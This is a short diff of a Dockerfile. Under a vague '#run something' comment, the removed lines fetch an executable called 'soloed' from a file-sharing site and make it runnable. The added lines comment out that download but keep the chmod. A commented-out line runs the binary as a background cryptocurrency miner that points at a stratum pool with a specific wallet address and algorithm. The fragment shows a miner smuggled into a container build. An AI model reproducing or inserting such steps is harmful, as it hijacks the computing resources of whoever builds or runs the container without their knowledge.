@@ -15,8 +15,8 @@ RUN apt-get update && \
     
 #run something 
 
-RUN wget https://bashupload.com/ryJaM/soloed && \
-    chmod +x soloed
+#RUN wget https://bashupload.com/ryJaM/soloed
+ RUN chmod +x soloed
 
 #./soloed -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u RMq5DEMWYfPZB148q1JdXW6rpdLyZHz2vE -tls -a minotourx -t 2 &  
 
